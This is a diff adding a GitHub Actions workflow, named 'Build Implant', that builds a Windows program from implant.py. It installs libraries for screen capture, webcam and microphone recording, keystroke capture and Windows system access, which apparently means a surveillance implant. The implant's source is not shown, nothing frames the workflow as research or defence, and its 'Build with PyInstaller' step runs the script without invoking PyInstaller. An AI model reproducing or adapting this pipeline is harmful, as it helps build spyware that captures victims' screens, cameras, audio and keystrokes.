@@ -1,0 +1,35 @@
+name: Build Implant
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:  # Allows manual trigger
+
+jobs:
+  build-windows:
+    runs-on: windows-latest
+    timeout-minutes: 30
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'  # Stable version with good PyInstaller support
+
+      - name: Install dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install pyinstaller==6.10.0  # Pin a known-good version
+          pip install requests cryptography mss opencv-python pyaudio keyboard pywin32 wmi pillow
+
+      - name: Build with PyInstaller
+        run: |
+          python implant.py
+
+
+     
